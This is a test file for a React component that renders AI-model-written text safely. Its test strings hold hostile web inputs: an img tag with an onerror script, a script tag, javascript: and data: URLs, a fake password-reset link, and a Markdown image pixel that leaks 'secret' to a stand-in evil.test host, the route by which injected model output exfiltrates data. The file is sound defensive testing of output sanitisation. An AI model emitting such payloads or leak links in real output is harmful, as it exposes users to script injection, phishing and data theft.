// @vitest-environment jsdom
import { cleanup, render, screen } from '@testing-library/react';
import { afterEach, describe, expect, it, vi } from 'vitest';
import { AresText } from './ares-text';

// AresText renders anything a model wrote: plain text with light formatting, no images, no
// requests, and a URL clickable only if that exact URL is in the source Items.

afterEach(() => {
  cleanup();
  vi.restoreAllMocks();
});

const SOURCES = ['The runbook: https://acme.test/runbook. See also [the deck](https://docs.test/d/1).'];

// Anything in the DOM that could load something.
function loaders(container: HTMLElement) {
  return container.querySelectorAll(
    'img, picture, source, video, audio, iframe, frame, object, embed, link, script, style, svg, image, [src], [srcset], [style], [background], [poster]',
  );
}

describe('AresText', () => {
  it('renders text as text: markup a model writes never becomes elements', () => {
    const { container } = render(
      <AresText
        text={'<img src="https://evil.test/x.png" onerror="alert(1)"> <b>bold</b> <script>x()</script>'}
      />,
    );
    expect(container.textContent).toBe(
      '<img src="https://evil.test/x.png" onerror="alert(1)"> <b>bold</b> <script>x()</script>',
    );
    expect(loaders(container)).toHaveLength(0);
    expect(container.querySelector('b')).toBeNull();
  });

  it('gives light formatting: bold, italic, code, line breaks, paragraphs and bullet lists', () => {
    const { container } = render(
      <AresText text={'**Shipped** the *login* fix with `retry()`.\nNext line.\n\n- one\n- two\n\nLast.'} />,
    );
    expect(container.querySelector('strong')?.textContent).toBe('Shipped');
    expect(container.querySelector('em')?.textContent).toBe('login');
    expect(container.querySelector('code')?.textContent).toBe('retry()');
    expect(container.querySelectorAll('p')).toHaveLength(2);
    expect(container.querySelector('br')).not.toBeNull();
    expect([...container.querySelectorAll('li')].map((li) => li.textContent)).toEqual(['one', 'two']);
  });

  it('makes a URL clickable only if that exact URL is in the source Items', () => {
    render(
      <AresText
        text="Read https://acme.test/runbook, then https://evil.test/x and https://acme.test/runbook/../admin."
        sources={SOURCES}
      />,
    );
    const links = screen.getAllByRole('link');
    expect(links.map((link) => link.getAttribute('href'))).toEqual(['https://acme.test/runbook']);
    expect(links[0]?.getAttribute('target')).toBe('_blank');
    expect(links[0]?.getAttribute('rel')).toContain('noreferrer');
    expect(screen.getByText(/https:\/\/evil\.test\/x/)).toBeTruthy();
  });

  it('shows a Markdown link to anywhere else as its words and its address, in plain text', () => {
    const { container } = render(
      <AresText
        text="[the deck](https://docs.test/d/1) and [reset your password](https://evil.test/reset)"
        sources={SOURCES}
      />,
    );
    expect(screen.getAllByRole('link').map((link) => [link.textContent, link.getAttribute('href')])).toEqual([
      ['the deck', 'https://docs.test/d/1'],
    ]);
    expect(container.textContent).toContain('reset your password (https://evil.test/reset)');
  });

  it('makes nothing clickable without sources, and never javascript: or data: addresses', () => {
    render(
      <AresText
        text="https://acme.test/runbook [x](javascript:alert(1)) data:text/html,<b>x</b>"
        sources={['javascript:alert(1) data:text/html,<b>x</b>']}
      />,
    );
    expect(screen.queryAllByRole('link')).toEqual([]);
  });

  it('never loads an image or makes a request, whatever the text asks for', () => {
    const fetch = vi.spyOn(globalThis, 'fetch').mockImplementation(() => Promise.reject(new Error('no')));
    const open = vi.spyOn(XMLHttpRequest.prototype, 'open');
    const { container } = render(
      <AresText
        text={
          'Status ![pixel](https://evil.test/p.png?leak=secret) ![](https://acme.test/runbook) and <img src=https://evil.test/q.png>'
        }
        sources={[...SOURCES, 'https://evil.test/p.png?leak=secret']}
      />,
    );
    expect(loaders(container)).toHaveLength(0);
    expect(container.textContent).toContain('[image: pixel]');
    expect(fetch).not.toHaveBeenCalled();
    expect(open).not.toHaveBeenCalled();
  });

  it('stays fast on 100k characters crafted to make its patterns backtrack', () => {
    for (const unit of ['![', '![a](', '[a](', '[', '](', '*a ', 'https://']) {
      const text = unit.repeat(Math.ceil(100_000 / unit.length));
      render(<AresText text={text} />);
      const start = performance.now();
      render(<AresText inline text={text} sources={[text]} />);
      expect(performance.now() - start).toBeLessThan(100);
      cleanup();
    }
  });

  it('renders inline, in a span, when asked', () => {
    const { container } = render(<AresText inline text={'Send **Dana** the numbers\nnow'} />);
    expect(container.firstElementChild?.tagName).toBe('SPAN');
    expect(container.querySelector('p')).toBeNull();
    expect(container.textContent).toBe('Send Dana the numbers now');
  });
});
